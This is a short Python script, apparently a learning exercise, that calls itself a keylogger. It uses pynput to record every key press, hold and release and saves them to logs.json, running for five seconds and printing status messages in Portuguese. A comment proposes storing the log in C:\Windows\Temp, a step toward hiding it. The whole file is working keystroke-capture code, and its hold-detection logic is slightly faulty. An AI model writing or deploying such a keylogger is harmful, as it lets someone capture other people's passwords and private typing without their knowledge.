from pynput import keyboard
import json
from threading import Timer

key_list = []
x = False  # Value to if held


# Trocar para C:\Windows\Temp\logs.json
def update_json_file(key_list):
    with open('logs.json', '+wb') as key_log:
        key_list_bytes = json.dumps(key_list).encode()
        key_log.write(key_list_bytes)


def on_press(key):
    global x, key_list
    if x == False:
        key_list.append({'Pressed': f'{key}'})
        x = True
    if x == True:
        key_list.append({'Held': f'{key}'})  # f'Key {key} pressed'
    update_json_file(key_list)


def on_release(key):
    global x, key_list
    key_list.append({'Released': f'{key}'})  # f'Key {key} released'
    if x == True:
        x = False
    update_json_file(key_list)


print(
    "[+] Keylogger funcionando com sucesso!\n[!] Salvando dados no arquivo 'logs.json'"
)

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    Timer(5, listener.stop).start()
    listener.join()
    print("[-] Keylogger finalizado!")
